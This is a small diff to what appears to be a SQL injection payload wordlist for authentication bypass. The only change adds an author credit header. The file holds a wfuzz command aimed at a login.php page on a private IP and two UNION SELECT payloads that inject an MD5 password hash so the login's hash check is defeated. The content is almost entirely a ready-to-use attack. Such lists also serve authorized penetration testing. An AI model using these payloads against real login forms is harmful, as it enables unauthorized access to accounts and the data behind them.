@@ -1,3 +1,5 @@
+#                                              Auth Bypass by Sayanthan
+
 #wfuzz -c --hh=10 -u http://172.16.76.158:8080/login.php -w auth_bypass_with_hash_check_sqli.txt -d "username=FUZZ&password=password123"
 ' AND 1=0 UNION ALL SELECT '482c811da5d5b4bc6d497ffa98491e38
 ' AND 1=0 UNION ALL SELECT 'admin', '482c811da5d5b4bc6d497ffa98491e38
